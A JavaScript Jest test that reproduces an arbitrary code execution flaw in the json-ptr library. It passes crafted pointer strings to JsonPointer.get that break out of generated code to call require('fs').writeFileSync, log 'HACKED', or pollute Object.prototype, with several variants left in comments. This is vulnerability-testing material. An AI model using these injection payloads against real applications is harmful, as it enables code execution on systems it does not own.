test("Arbitrary code execution in json-ptr", () => {
  expect.assertions(2);
  const fs = require("fs");
  const jptr = require("json-ptr");
  const path = "./json-ptr";
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);
  let payload = "require('fs').writeFileSync('" + path + "',``);";
  JsonPointer = jptr.JsonPointer;
  try {
    // JsonPointer.get(
    //   {},
    //   "/aaa'])) !== 'undefined') {return it;}; 1 + (Object.prototype.polluted = `yes`); if(((['a"
    // );

    // JsonPointer.get({}, '/aaa\'\]\)\) !== \'undefined\') \{return it;\}; import \{ createRequire \} from "module"; const require = createRequire\(import.meta.url\); require\(\'fs\'\).writeFileSync\("json-ptr"\); console.log(\'HACKED\'); if((([\'a');
    JsonPointer.get(
      {},
      "/aaa'])) !== 'undefined') {return it;}; require('fs').writeFileSync(\"json-ptr\"); console.log('HACKED'); if(((['a"
    );
    // JsonPointer.get({}, '/aaa\'\]\)\) !== \'undefined\') \{return it;\}; import \{ readFileSync \} from \'fs\'; console.log(\'HACKED\'); if((([\'a');
  } catch (error) {
    console.log("err===>", error);
  }
  // expect({}.polluted).toBe("yes");
});
